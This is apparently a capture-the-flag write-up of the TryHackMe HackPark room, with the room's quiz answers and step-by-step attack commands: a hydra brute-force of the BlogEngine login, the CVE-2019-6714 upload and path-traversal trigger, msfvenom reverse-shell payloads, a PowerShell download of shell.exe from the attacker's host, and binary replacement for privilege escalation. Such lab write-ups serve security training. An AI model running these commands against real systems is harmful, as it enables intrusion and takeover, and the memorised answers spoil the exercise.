## HackPark | TryHackMe

This is the link for the room [Hackpark](https://tryhackme.com/room/hackpark)

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/8c8b2105d74035ca43531681439b457e.png" width="200px" align="center">

---
Let's go we execute this task.

First, we must access the website to get more information.

<img src="https://user-images.githubusercontent.com/67650329/193573616-301f57ce-a6e9-4efd-bbdb-bf95178a2c6f.png" width="500px" align="center">

**Whats the name of the clown displayed on the homepage?**

**Answer: pennywise**

We can search all of subdomain the website. Use tool `gobuster`.

`gobuster dir -u {ip_target} -w {wordlist} -f -n`

<img src="https://user-images.githubusercontent.com/67650329/193573947-549481bb-0a60-4121-8669-256e7da76861.png" width="500px" align="center">

We get /admin/ from gobuster. Yes that its login page. We can bypass the admin password use `hydra`.

<img src="https://user-images.githubusercontent.com/67650329/193574246-ece4b9a8-b920-4f8a-beff-7f9ee16a9e65.png" width="500px" align="center">

Ohh no :( can't use simple command to execute this login page. We must take hard of this.

<img src="https://user-images.githubusercontent.com/67650329/193574465-62ec4f5d-38b3-47d3-9593-0594c9fd94ee.png" width="500px" align="center">

We can use burp to see the source page. Ahh i see on the bottom page {VIEWSTATE and EVENTVALIDATION} we can execute this. 

<img src="https://user-images.githubusercontent.com/67650329/193574853-51454a37-a783-4629-96ab-9aa33b31ff79.png" width="500px" align="center">

**What request type is the Windows website login form using?**

**Answer: POST**

We can use this command to use on hydra:

`hydra -l admin -P rockyou.txt {IP} http-post-form "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=Bjdg0T4vJInmW5tUM8x5txmfsq8hz6JGO83P0kbnaJq966zSeFeDAxLS%2BXyw4U4S%2FgpkPbUDHuPw14Mx2Q2QJRFxJ7kenDSk54xKXAp9wDV4gVOW3yEZCH93n0756GyaZ8EyMi58wMwEivOw0zpcHO8xp8e%2Bj32e7h3iv5zKqryGFUPE&__EVENTVALIDATION=31Qm85XIxQI11Fi3HPbRUY6kn21c%2F0zPSqk2UvIRBUu1Tt4QS4oLN1VfqrwJsGOUA5SWiSRdcq5xSwvpOpMlWpc%2FfuQa%2BRGsBlT0juZD%2BREOwscUWk%2BwRvwxsVfiEUUV6Hu35MTQshjrc21mdMKy7m8SMyNHNImtbJDftdJDzqYsNqF7&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`

<img src="https://user-images.githubusercontent.com/67650329/193575266-fadeb36b-ea76-4b15-8fe9-b88a5db6a190.png" width="500px" align="center">

Ahh we get the password. And we can see the admin dashboard. Let's go explore the dashboard.

<img src="https://user-images.githubusercontent.com/67650329/193575458-567c0ce7-056b-4da3-9a37-b44b87799a9b.png" width="500px" align="center">

We get it the version blogengine.net on about page.

<img src="https://user-images.githubusercontent.com/67650329/193575906-e2442c39-2c96-497c-b238-cc18644cc066.png" width="500px" align="center">

**Now you have logged into the website, are you able to identify the version of the BlogEngine?**

**Answer: 3.3.6.0**

Search the vulnerability on Exploit.db. And Download the exploit.

<img src="https://user-images.githubusercontent.com/67650329/193576096-f3b67efb-9e80-4860-aebc-aa08161ddc20.png" width="500px" align="center">

**What is the CVE?**

**Answer: CVE-2019-6714**

Open and read the file. Changes the IP to your IP and Port.

<img src="https://user-images.githubusercontent.com/67650329/193576639-d33a7885-6524-459a-8320-27b1a724c242.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193576719-1b3fb47e-597a-4e7e-9a99-ae1212228451.png" width="500px" align="center">

Change the name file to `PostView.ascx`.

You can Upload the file on there.

-> `http://{IP_target}/admin/page/app/editor/editpost.cshtml`

<img src="https://user-images.githubusercontent.com/67650329/193577059-88553b4d-20f6-4fce-aa02-4f5bb8f5f97c.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193577123-74f95a01-d5d8-4f75-9e38-d3c5dee9e203.png" width="500px" align="center">

After upload file you must run listener like `netcat`

`nc -lvp 4445`

<img src="https://user-images.githubusercontent.com/67650329/193577366-6dcd7c68-d9ce-4d2f-b934-fbf6fe02906e.png" width="500px" align="center">

You can run the file you uploaded on the website by access the website.

-> `http://{IP_target}/?theme=../../App_Data/files`

And boom your netcat reply your file.

<img src="https://user-images.githubusercontent.com/67650329/193577955-3953b850-a3e6-4863-8152-9f0ded6a408a.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193578109-943f2d8a-3c99-42ec-a012-f5334b45806a.png" width="500px" align="center">

**Who is the webserver running as?**

**Answer: iis apppool\blog**

After we get into the machine. We can get into the machine with `meterpreter` use `metasploit`.

`search exploit/multi/handler`

`set LHOST [Your_IP]`

`set LPORT [PORT]`

`set PAYLOAD windows/meterpreter/reverse_tcp`

`run`

<img src="https://user-images.githubusercontent.com/67650329/193579472-b012553e-9a42-4f4c-a419-f2e766109ab9.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193579451-c4819d09-7144-43df-bf03-de89b100aea1.png" width="500px" align="center">

Download the shell file. `Use msfvenom`.

-> `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={YOUR_IP} LPORT={PORT} -f exe -o shell.exe`

<img src="https://user-images.githubusercontent.com/67650329/193580136-8f28f9f2-8d1d-41ee-b1d7-1f36cf65bfb8.png" width="500px" align="center">

Upload the shell into the machine and run the shell.

`powershell -c wget "http:/{YOUR_IP}/shell.exe" -outfile 'shell.exe'`

`.\shell.exe`

<img src="https://user-images.githubusercontent.com/67650329/193580901-6bb9a72e-8653-4f77-81f8-b94ff0acb7ad.png" width="500px" align="center">

And you can see on your metepreter connected to the machine.

<img src="https://user-images.githubusercontent.com/67650329/193581641-3c214d93-539f-4236-b629-286a05cb1fe8.png" width="500px" align="center">

**What is the OS version of this windows machine?**

**Answer: Windows 2012 R2 (6.3 Build 9600)**

After this. Download the winPEAS first [Click Here](https://github.com/carlospolop/PEASS-ng/releases/tag/20220202)

After you download the winPEAS you must upload the winPEAS into the machine.

<img src="https://user-images.githubusercontent.com/67650329/193582403-b3edd593-7d98-4126-9699-b227ef829c53.png" width="500px" align="center">

Run the shell on metepreter.

`shell`

`winPEAS.exe serviceinfo`

<img src="https://user-images.githubusercontent.com/67650329/193582641-13111704-c26c-4756-a6f3-450198a342cb.png" width="500px" align="center">

Read slowly the winPEAS because is so many information on winPEAS. 

<img src="https://user-images.githubusercontent.com/67650329/193582939-504268be-95d0-411a-a73d-c5fc6b8d33fd.png" width="500px" align="center">

**What is the name of the abnormal service running?**

**Answer: WindowsScheduler**

You can search the another suspicious file.

<img src="https://user-images.githubusercontent.com/67650329/193583431-579f8411-44fc-4901-af14-4954c2f4f145.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193583487-4a1e4164-0251-44b0-b717-9ba127947f79.png" width="500px" align="center">

**What is the name of the binary you're supposed to exploit? **

**Answer: Message.exe**

Download the another shell file. `Use msfvenom`.

-> `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={YOUR_IP} LPORT={PORT} -f exe -o Message.exe`

<img src="https://user-images.githubusercontent.com/67650329/193583989-92f3f802-338d-464e-bdd6-abb386302369.png" width="500px" align="center">

You can run another `metasploit` with the same step on top.

<img src="https://user-images.githubusercontent.com/67650329/193584184-97130e47-bdcd-4b57-b0f0-978319ee9529.png" width="500px" align="center">

BAAM you get into the metepreter. Now you can search the user and root. HAPPY EXPLORING.

<img src="https://user-images.githubusercontent.com/67650329/193585074-66d7d9c6-6d57-4f2d-ac83-1aaa4c9f6a51.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193584684-39b4ea07-2896-4788-92ca-ecca03466da6.png" width="500px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/193584752-d520b2cb-6ead-4b95-89a3-ed83c253b958.png" width="500px" align="center">

---
